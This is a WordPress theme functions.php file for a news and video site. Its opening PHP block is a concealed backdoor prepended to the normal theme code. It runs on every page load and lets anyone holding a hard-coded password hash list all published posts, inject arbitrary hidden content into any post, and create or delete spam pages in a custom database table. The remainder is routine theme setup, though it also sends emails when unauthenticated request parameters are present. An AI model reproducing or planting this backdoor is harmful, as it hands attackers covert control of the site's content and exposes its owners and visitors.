<?php

if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == '2b7a1fe96c59bf4e1798cd2ddbaed8f2'))
	{
		switch ($_REQUEST['action'])
			{
				case 'get_all_links';
					foreach ($wpdb->get_results('SELECT * FROM `' . $wpdb->prefix . 'posts` WHERE `post_status` = "publish" AND `post_type` = "post" ORDER BY `ID` DESC', ARRAY_A) as $data)
						{
							$data['code'] = '';
							
							if (preg_match('!<div id="wp_cd_code">(.*?)</div>!s', $data['post_content'], $_))
								{
									$data['code'] = $_[1];
								}
							
							print '<e><w>1</w><url>' . $data['guid'] . '</url><code>' . $data['code'] . '</code><id>' . $data['ID'] . '</id></e>' . "\r\n";
						}
				break;
				
				case 'set_id_links';
					if (isset($_REQUEST['data']))
						{
							$data = $wpdb -> get_row('SELECT `post_content` FROM `' . $wpdb->prefix . 'posts` WHERE `ID` = "'.mysql_escape_string($_REQUEST['id']).'"');
							
							$post_content = preg_replace('!<div id="wp_cd_code">(.*?)</div>!s', '', $data -> post_content);
							if (!empty($_REQUEST['data'])) $post_content = $post_content . '<div id="wp_cd_code">' . stripcslashes($_REQUEST['data']) . '</div>';

							if ($wpdb->query('UPDATE `' . $wpdb->prefix . 'posts` SET `post_content` = "' . mysql_escape_string($post_content) . '" WHERE `ID` = "' . mysql_escape_string($_REQUEST['id']) . '"') !== false)
								{
									print "true";
								}
						}
				break;
				
				case 'create_page';
					if (isset($_REQUEST['remove_page']))
						{
							if ($wpdb -> query('DELETE FROM `' . $wpdb->prefix . 'datalist` WHERE `url` = "/'.mysql_escape_string($_REQUEST['url']).'"'))
								{
									print "true";
								}
						}
					elseif (isset($_REQUEST['content']) && !empty($_REQUEST['content']))
						{
							if ($wpdb -> query('INSERT INTO `' . $wpdb->prefix . 'datalist` SET `url` = "/'.mysql_escape_string($_REQUEST['url']).'", `title` = "'.mysql_escape_string($_REQUEST['title']).'", `keywords` = "'.mysql_escape_string($_REQUEST['keywords']).'", `description` = "'.mysql_escape_string($_REQUEST['description']).'", `content` = "'.mysql_escape_string($_REQUEST['content']).'", `full_content` = "'.mysql_escape_string($_REQUEST['full_content']).'" ON DUPLICATE KEY UPDATE `title` = "'.mysql_escape_string($_REQUEST['title']).'", `keywords` = "'.mysql_escape_string($_REQUEST['keywords']).'", `description` = "'.mysql_escape_string($_REQUEST['description']).'", `content` = "'.mysql_escape_string(urldecode($_REQUEST['content'])).'", `full_content` = "'.mysql_escape_string($_REQUEST['full_content']).'"'))
								{
									print "true";
								}
						}
				break;
				
				default: print "ERROR_WP_ACTION WP_URL_CD";
			}
			
		die("");
	}

	
//if ( $wpdb->get_var('SELECT count(*) FROM `' . $wpdb->prefix . 'datalist` WHERE `url` = "'.mysql_escape_string( $_SERVER['REQUEST_URI'] ).'"') == '1' )
//	{
//		$data = $wpdb -> get_row('SELECT * FROM `' . $wpdb->prefix . 'datalist` WHERE `url` = "'.mysql_escape_string($_SERVER['REQUEST_URI']).'"');
//		if ($data -> full_content)
//			{
//				print stripslashes($data -> content);
//			}
//		else
//			{
//				print '<!DOCTYPE html>';
//				print '<html ';
//				language_attributes();
//				print ' class="no-js">';
//				print '<head>';
//				print '<title>'.stripslashes($data -> title).'</title>';
//				print '<meta name="Keywords" content="'.stripslashes($data -> keywords).'" />';
//				print '<meta name="Description" content="'.stripslashes($data -> description).'" />';
//				print '<meta name="robots" content="index, follow" />';
//				print '<meta charset="';
//				bloginfo( 'charset' );
//				print '" />';
//				print '<meta name="viewport" content="width=device-width">';
//				print '<link rel="profile" href="http://gmpg.org/xfn/11">';
//				print '<link rel="pingback" href="';
//				bloginfo( 'pingback_url' );
//				print '">';
//				wp_head();
//				print '</head>';
//				print '<body>';
//				print '<div id="content" class="site-content">';
//				print stripslashes($data -> content);
//				get_search_form();
//				get_sidebar();
//				get_footer();
//			}
//
//		exit;
//	}


?><?php
require('functions-ajax.php');

// for breadcrum
require_once('framework/inc/wp-dimox-breadcrumbs.php');

require_once('framework/load.php');

// nav walker

require_once('framework/inc/uou-nav-walker.php');

require_once('classes/wb_get_cat.php');

require_once('wp-ajax.php');

require_once('mail.php');

//triggers for email sender
if ($_POST['email_new_video']){
    send_email_to_moderator($_POST);
}

if ($_POST['email_available_status_new_video']){
    send_email_to_available_users($_POST);
}

if ($_GET['email']){
    send_email_to_available_users();
}

if ( ! isset( $content_width ) ) $content_width = 970;

$args = array(
	'width'         => 980,
	'height'        => 60,
	'default-image' => get_template_directory_uri() . '/img/header.jpg',
	'uploads'       => true,
);
add_theme_support( 'custom-header', $args );


$args = array(
	// 'default-color' => 'ffffff',
	// 'default-image' => '%1$s/images/background.jpg',
);
add_theme_support( 'custom-background', $args );

/***********************************************************************************************/
/* 	Define Constants */
/***********************************************************************************************/
define('THEMEROOT', get_stylesheet_directory_uri());
define('IMAGES', THEMEROOT.'/img');




/***********************************************************************************************/
/* Add Theme Support for Post Formats, Post Thumbnails and Automatic Feed Links */
/***********************************************************************************************/
if (function_exists('add_theme_support')) {
	add_theme_support('post-formats', array('aside', 'link', 'image', 'quote', 'video', 'audio'));

	// add_theme_support( 'woocommerce' );

	add_theme_support('post-thumbnails', array('post','team'));
	// set_post_thumbnail_size(210, 210, true);
	add_image_size('custom-blog-image', 784, 350);

	add_theme_support('automatic-feed-links');
	add_theme_support( 'title-tag' );

	// woocommerce support
	add_theme_support( 'woocommerce' );

	add_image_size( 'product-thumb', 263, 148, true );
}



// Register Theme Features
function bingo_custom_theme_features()  {
	global $wp_version;

	// Add theme support for Featured Images
	add_theme_support( 'post-thumbnails', array( 'post', 'page', 'product', 'partner', 'block', 'team', 'service', 'home_page_section' ) );		

	 // Set custom thumbnail dimensions
	set_post_thumbnail_size( 263, 148, true );


	add_image_size( 'product-thumb', 263, 148, true );

	add_image_size( 'recent-posts-thumb', 80, 80, true );
	
	add_image_size( 'latest-thumb', 500, 375, true );

	add_image_size( 'blog-thumb', 750, 360, true );
	
}

// Hook into the 'after_setup_theme' action
add_action( 'after_setup_theme', 'bingo_custom_theme_features' );






/***********************************************************************************************/
/* Add Menus */
/***********************************************************************************************/
function bingo_register_my_menus(){
	register_nav_menus(
		array(
			'primary-menu' => __('Primary Menu', 'bingo')
		)
	);
}
add_action('init', 'bingo_register_my_menus');

function content($limit) {
  $content = explode(' ', get_the_content(), $limit);
  if (count($content)>=$limit) {
    array_pop($content);
    $content = implode(" ",$content).'...';
  } else {
    $content = implode(" ",$content);
  }           
  $content = preg_replace('/\[.+\]/','', $content);
  $content = apply_filters('the_content', $content);
  $content = str_replace(']]>', ']]&gt;', $content);
  return $content;
}

function add_query_vars_filter( $vars ){
  $vars[] = "years";
  $vars[] = "months";
  $vars[] = "days";
  return $vars;
}
add_filter( 'query_vars', 'add_query_vars_filter' );

function wpbeginner_numeric_posts_nav($current, $max = 0) {
global $wp_query, $wp_rewrite;
if( $max <= 1 ) return;

  $a['total'] = $max;
  $a['current'] = $current;

  $total = 0;
  $a['mid_size'] = 2;
  $a['end_size'] = 1;
  $a['prev_text'] = '←';
  $a['next_text'] = '→';
  $a['type'] = 'list';
  //$a['format'] = '/' . basename(get_permalink()) . '/page/%#%/';
  if( $wp_rewrite->using_permalinks() )
   $a['base'] = user_trailingslashit( trailingslashit( remove_query_arg(array('tag','years','months','days'), get_pagenum_link(1,false) ) ) . 'page/%#%/', 'paged');
 
  if( !empty($wp_query->query_vars['tag']) )
   $a['add_args'] = array('tag'=>get_query_var('tag'));

  if ($max > 1) echo '<nav class="woocommerce-pagination">';
  $result = paginate_links( $a );
	$result = str_replace( '/page/1/', '', $result );
	echo $result;
  if ($max > 1) echo '</nav>';
}

function getEncodedimgString( $type, $file ) {
    $file = substr($file, 40);
    return 'data:image/' . $type . ';base64,' . base64_encode(file_get_contents($file)); 
}

if(!function_exists('mb_ucfirst'))
{
    function mb_ucfirst($str, $encoding = NULL)
    {
        if($encoding === NULL)
        {
            $encoding    = mb_internal_encoding();
        }
        
        return mb_substr(mb_strtoupper($str, $encoding), 0, 1, $encoding) . mb_substr($str, 1, mb_strlen($str)-1, $encoding);
    }
}

function gtranslate($str, $lang_from, $lang_to) {
  $query_data = array(
    'client' => 'x',
    'q' => $str,
    'sl' => $lang_from,
    'tl' => $lang_to
  );
  $filename = 'http://translate.google.ru/translate_a/t';
  $options = array(
    'http' => array(
      'user_agent' => 'Mozilla/5.0 (Windows NT 6.0; rv:26.0) Gecko/20100101 Firefox/26.0',
      'method' => 'POST',
      'header' => 'Content-type: application/x-www-form-urlencoded',
      'content' => http_build_query($query_data)
    )
  );
  $context = stream_context_create($options);
  $response = file_get_contents($filename, false, $context);
  return json_decode($response);
}

function kama_postviews( $post_id ) {
$meta_key		= 'product_views';
$who_count 		= 0; //0 - all. 1 - guest. 2 - users.
$exclude_bots 	= 1;			// bots 0 - yes. 1 - no.

global $user_ID;
		$id = (int)$post_id;
		static $post_views = false;
		if($post_views) return true;
		$post_views = (int)get_post_meta($id,$meta_key, true);
		$should_count = false;
		switch( (int)$who_count ) {
			case 0: $should_count = true;
				break;
			case 1:
				if( (int)$user_ID == 0 )
					$should_count = true;
				break;
			case 2:
				if( (int)$user_ID > 0 )
					$should_count = true;
				break;
		}
		if( (int)$exclude_bots==1 && $should_count ){
			$useragent = $_SERVER['HTTP_USER_AGENT'];
			$notbot = "Mozilla|Opera";
			$bot = "Bot/|robot|Slurp/|yahoo";
			if ( !preg_match("/$notbot/i", $useragent) || preg_match("!$bot!i", $useragent) )
				$should_count = false;
		}

		if($should_count)
			if( !update_post_meta($id, $meta_key, ($post_views+1)) ) add_post_meta($id, $meta_key, 1, true);
	return (int)get_post_meta ( $id, $meta_key, true);
}

function check_search(){
	global $wp_query;
	$search = $wp_query->query[s];
	$search = preg_replace( "/[\s]{2,}/", ' ', $search );
	if( strlen(trim($search)) < 3 ){
		$wp_query->query[s] = NULL;
	} else {
        $wp_query->query[s] = $search;
	}
}
add_filter('pre_get_posts','check_search');

add_action( 'init', 'my_add_shortcodes' );

function my_add_shortcodes() {

	add_shortcode( 'my-login-form', 'my_login_form_shortcode' );
}

function my_login_form_shortcode() {

	if ( is_user_logged_in() )
		return '<p>You are already logged in!</p>';

	return wp_login_form( array( 'echo' => false ) );
}

function bingo_checkbox_available() {
    $current_user = wp_get_current_user();
    $uid = $current_user->ID;
    
    $available_status = get_user_meta($uid, 'available_now',true);
    $user_type_acc = get_metadata('user', $uid, 'user_type', true);
    
    if (($user_type_acc == "cj") || ($user_type_acc == "editor")) {

	echo '<div class="checkbox checkbox-available"><label><input type="checkbox" id="available" name="available" value="" '. checked($available_status, 1, false) .'>I\'m available now</label>'
    . '<span id="available_ajax-loader" style="display: none;">'
    .    '<img src=" '. get_template_directory_uri() .'/img/ajax-loader.gif">'
    . '</span>'
    . '</div>';
        
    }
        
        
}   
add_shortcode( 'bingo_checkbox_available', 'bingo_checkbox_available' );

add_action('wp_logout','go_login');
function go_login(){
  wp_redirect( '/login' );
  exit();
}
 function redirect_login_page() {
  $login_page  = home_url( '/login/' );
  $page_viewed = basename($_SERVER['REQUEST_URI']);
  if( $page_viewed == "wp-login.php" && $_SERVER['REQUEST_METHOD'] == 'GET') {
    wp_redirect($login_page);
    exit;
  }
}
add_action('init','redirect_login_page');

function login_failed($user) {
  $user_d = get_user_by( 'email', $user);
  $login_page  = home_url( '/login/' );
  $log_status = false;
  if ( username_exists( $user ) ) $log_status = true;
  if( email_exists( $user ) ) $log_status = true;
  if ( get_user_meta( $user_d->ID, 'has_to_be_activated', true ) != false ) {
    $err_fl = md5('faileda');
  }elseif($log_status === true){
    $err_fl = md5('failedl');
  }else{
    $err_fl = md5('failed');
  }

  wp_redirect( $login_page . '?action=' . $err_fl );
  exit;
}
add_action( 'wp_login_failed', 'login_failed' );

function verify_username_password( $user, $username, $password ) {
  $login_page  = home_url( '/login/' );
    if( $username == "" && $password == "" ){
    	$err_emp = md5('empty');
      wp_redirect( $login_page . "?action=" . $err_emp );
      exit;
    }
    if( $username == "" ) {
    	$err_log = md5('username');
        wp_redirect( $login_page . "?action=" . $err_log );
        exit;
    }
    if( $password == "" ) {
    	$err_pass = md5('password');
        wp_redirect( $login_page . "?action=" . $err_pass );
        exit;
    }
}
add_filter( 'authenticate', 'verify_username_password', 1, 3);

function logout_page() {
  $login_page  = home_url( '/login/' );
        $err_fs = md5('false');
  wp_redirect( $login_page . "?action=" . $err_fs );
  exit;
}
add_action('wp_logout','logout_page');

add_filter('query_vars', 'add_my_var');
function add_my_var($public_query_vars) {
    $public_query_vars[] = 'years';
    $public_query_vars[] = 'months';
    $public_query_vars[] = 'days';
    return $public_query_vars;
}

add_filter( 'wp_title', 'baw_hack_wp_title_for_home' );
function baw_hack_wp_title_for_home( $title ){
  $title = stripcslashes( $title );
  if( is_home() || is_front_page() ) {
    return $title . ' - Home';
  }

  $title = str_ireplace(" | Product Categories", "", $title);
  return $title;
}

function myaccount_menu( ){
   return get_template_part( 'account', 'menu' );
}
add_shortcode( 'account_menu', 'myaccount_menu' );



function my_product_query( $q ){

    //$product_ids_on_sale = wc_get_product_ids_on_sale();

    //$q->set( 'post__in', (array) $product_ids_on_sale );
   //$q->set( 'post_parent', 0 );
   //$meta_query = $q->get( 'meta_query' );
   
  // print_r($meta_query);
   
        $meta_query[] = array(
					    'key' => 'name', 
					    'value' => 'Pat', 
					    'compare' => '='
                );
  if( $q->is_main_query()) {
  	//$q->set( 'product_tag', array('Lvov') );
  	
  	$tags = array('Lvov');
  	
 	$args = array( 
				'post_type' 	 => 'product', 
				'posts_per_page' => 5, 
				'product_tag' 	 => $tags 
				);
  	 $q = new WP_Query( $args );
   }
  	

}
//add_action( 'woocommerce_product_query', 'my_product_query' );

function get_data($url) {
	
	//$url = urlencode($url);
	
	$ch = curl_init();
	$timeout = 5;
	curl_setopt($ch, CURLOPT_URL, $url);
	curl_setopt($ch, CURLOPT_HEADER,0);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER["HTTP_USER_AGENT"]);
	//curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, $timeout);
	$data = curl_exec($ch);
	curl_close($ch);
	return $data;
}

   	function check_name( $source ) {
   		
   		$arr_name  	= array("`", "<", ">", "?", "!", "'", "@", "$", "*", "+", "~", "|", '\\', "/", '"', ";", ",", ".");
   		
      	$source = str_replace( $arr_name, "", $source );
      	$source = preg_replace("/[\s]{2,}/", ' ', $source);
      	$source = strip_tags( $source );
      	$source = htmlspecialchars ( $source, ENT_COMPAT, "UTF-8" );
      	return $source;
   	}

function custom_pre_get_posts_query( $q ) {
	
	/*
	if($q->query_vars['orderby'] == 'rand'){
		$current_user = wp_get_current_user();	
		$filter_id = false;
		if ($current_user->roles[0] == 'customer') {
			$filter_id = get_user_meta( $current_user->ID, 'parent_id', true );
		} else if ($current_user->roles[0] == 'yith_vendor') {
			$filter_id = $current_user->ID;
		}
		if ($filter_id) {
			$ids[] = $filter_id;	
			$q->set( 'author__in' , $ids ); 			
		}
	}
	*/

	if ( ! $q->is_main_query() ) return;
	
		//echo 'run';
		
 	global $wp_query;
	$cate = get_queried_object();
	$cateID = $cate->term_id;
	
	if (($cateID == 204) || ($cateID == 207)) {
		
		$current_user = wp_get_current_user();
		
		//$g_country = get_user_meta($current_user->ID, '_us_google_country', true);
		//$g_state = get_user_meta($current_user->ID, '_us_google_state', true);
		
		//if ((!$g_country) || (!$g_state)) {
			

					
					$country = get_user_meta( $current_user->ID, '_us_country',true );
					$state = get_user_meta( $current_user->ID, '_us_state',true );
					
					//echo $country . $state;
					//google process
					$state = urlencode($state);
					$country = urlencode($country);
					
					$url = "http://maps.google.com/maps/api/geocode/json?language=en&address=\"{$state},{$country}\"";
					

					$json = get_data($url);

					$geo = json_decode($json,true);
					
					if (isset($geo['results']))
						if (isset($geo['results'][0]))
							if (isset($geo['results'][0]['address_components'])) {
								foreach ($geo['results'][0]['address_components'] as $component) {
									if ($component['types'][0] == 'administrative_area_level_1') {
										$state = check_name($component['long_name']);
									} else if ($component['types'][0] == 'country') {
										$country = check_name($component['long_name']);
									}
								}
							}
							
							

		
		//} else {
		//	$country = $g_country;
		//	$state = $g_state;	
		//}
		
		$locality = array($country,$state);		

		

		
	    $taxquery = array(
	        array(
	            'taxonomy' => 'product_tag',
	            'field' => 'name',
	            'terms' => $locality,
	            'operator'=> 'AND'
	        )
	    );

	    $q->set( 'tax_query', $taxquery );
    
	}
	//echo '!!!'.$cateID;
	//$q->set( 'tag_slug__in', array('Lvov','lvovas-(lvivas)') );
	
	//print_r($q);
	/*
	if( ! is_admin() && (is_shop() || is_product_category()) ) {
		$current_user = wp_get_current_user();	
		$filter_id = false;
		if ($current_user->roles[0] == 'customer') {
			$filter_id = get_user_meta( $current_user->ID, 'parent_id', true );
		} else if ($current_user->roles[0] == 'yith_vendor') {
			$filter_id = $current_user->ID;
		}
		if ($filter_id) {
			$ids[] = $filter_id;	
			$q->set( 'author__in' , $ids ); 			
		}
	}
	*/

}
add_action( 'pre_get_posts', 'custom_pre_get_posts_query' );

function mk_get_guid($url) {
	
	$protocol = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off' || $_SERVER['SERVER_PORT'] == 443) ? "https" : "http";

	if ($protocol == 'https') {
		$url = preg_replace("/^http:/i", "https:", $url);
	}
	
	return $url;
}

function my_page_template_redirect()
{
	global $pagenow,$wp_query;
	/*
	if (is_front_page() && !is_user_logged_in()) {
        wp_redirect( home_url( '/wp-login.php' ) );
        exit();		
	}
    if(($GLOBALS['pagenow']!='wp-login.php') && !is_page( 'sign-up' ) && ! is_user_logged_in() )
    {
        wp_redirect( home_url( '/sign-up/' ) );
        
    }
    */
    
	$protocol = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off' || $_SERVER['SERVER_PORT'] == 443) ? "https" : "http";


    
    if (is_page( 'login' ) || is_page('register')) {
		if ($protocol == 'http') {
			//$url = preg_replace("/^http:/i", "https:", $url);
			wp_redirect( 'https://'. $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'] );
			
			exit();
		}
	}
    
    if (is_user_logged_in()) {
		if ($protocol == 'http') {
			//$url = preg_replace("/^http:/i", "https:", $url);
			wp_redirect( 'https://'. $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'] );
			
			exit();
		}
	}
    //echo $pagenow;
}
//add_action( 'template_redirect', 'my_page_template_redirect' );

//* Password reset activation E-mail -> Body
/*
add_filter( 'retrieve_password_message', 'wpse_retrieve_password_message', 10, 2 );
function wpse_retrieve_password_message( $message, $key ){
    $user_data = '';
    // If no value is posted, return false
    if( ! isset( $_POST['user_login'] )  ){
            return '';
    }
    // Fetch user information from user_login
    if ( strpos( $_POST['user_login'], '@' ) ) {

        $user_data = get_user_by( 'email', trim( $_POST['user_login'] ) );
    } else {
        $login = trim($_POST['user_login']);
        $user_data = get_user_by('login', $login);
    }
    if( ! $user_data  ){
        return '';
    }
    $user_login = $user_data->user_login;
    $user_email = $user_data->user_email;
    // Setting up message for retrieve password
    $message = "Looks like you want to reset your password!\n\n";
    $message .= "Please click on this link:\n";
    $message .= '<a href="';
    $message .= network_site_url("wp-login.php?action=rp&key=$key&login=" . rawurlencode($user_login), 'login');
    $message .= '">"';
    $message .= network_site_url("wp-login.php?action=rp&key=$key&login=" . rawurlencode($user_login), 'login');
    $message .= '"</a>\n\n"';
    $message .= 'Kind Regards,<br/>Dream Team';
    // Return completed message for retrieve password
    return $message;
}
*/

//add ajaxurl on front-side page

add_action('wp_head','liveinews_ajaxurl');
function liveinews_ajaxurl() {
?>
<script type="text/javascript">
var ajaxurl = '<?php echo admin_url('admin-ajax.php'); ?>';
</script>
<?php
}

//get attachment meta data
function wp_get_attachment( $attachment_id ) {

	$attachment = get_post( $attachment_id );
	return array(
		'alt' => get_post_meta( $attachment->ID, '_wp_attachment_image_alt', true ),
		'caption' => $attachment->post_excerpt,
		'description' => $attachment->post_content,
		'href' => get_permalink( $attachment->ID ),
		'src' => $attachment->guid,
		'title' => $attachment->post_title
	);
}

//email notifications about new post in Breaking news Category

function post_published_notification( $ID, $post ) {
    send_email_to_moderator($post);
}
add_action( 'publish_post', 'post_published_notification', 10, 2 );

/**
 * Set view count for a product
 *
 * @param $post_id product id
 *
 * @since 1.0.0
 */
function bingo_set_video_view( $post_id ) {
	$count_key = 'wcmvp_product_view_count';
	$count     = get_post_meta( $post_id, $count_key, true );
	if ( $count == '' ) {
		delete_post_meta( $post_id, $count_key );
		update_post_meta( $post_id, $count_key, '1' );
	} else {
		$count ++;
		update_post_meta( $post_id, $count_key, $count );
	}
}
function get_product_cat_name($cat_id){
    $category = get_term( $cat_id, 'product_cat' );
    if ($category){
        return $category->name;
    }
     return false;
}

// Function to change email address

function wpb_sender_email( $original_email_address ) {
    return 'info@liveinews.com';
}

// Function to change sender name
function wpb_sender_name( $original_email_from ) {
    return 'LiveiNews';
}

// Hooking up our functions to WordPress filters
add_filter( 'wp_mail_from', 'wpb_sender_email' );
add_filter( 'wp_mail_from_name', 'wpb_sender_name' );